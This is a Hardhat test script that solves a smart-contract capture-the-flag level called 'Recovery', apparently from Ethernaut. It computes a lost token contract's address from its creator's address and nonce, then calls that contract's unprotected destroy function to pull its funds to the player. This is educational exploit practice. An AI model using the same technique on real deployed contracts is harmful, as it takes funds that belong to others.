const { expect } = require("chai");
const { ethers } = require("hardhat");

const { getContractAddress } = require('@ethersproject/address');
const { setupLevel } = require("./utils");

describe("Recovery", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("Recovery", player.address, ethers.utils.parseEther("0.001"));
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        // Since we know the address of the factory/recovery contract
        // and know that the lost address was the first one deployed,
        // we can simply calculate its address using the factory/recovery contract address and a nonce of 1
        const lostAddress = getContractAddress({
            from: instance.address,
            nonce: 1
        });

        // We can then call the `destroy` function to get back the lost funds
        (await ethers.getContractFactory("SimpleToken")).attach(lostAddress).destroy(player.address);
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});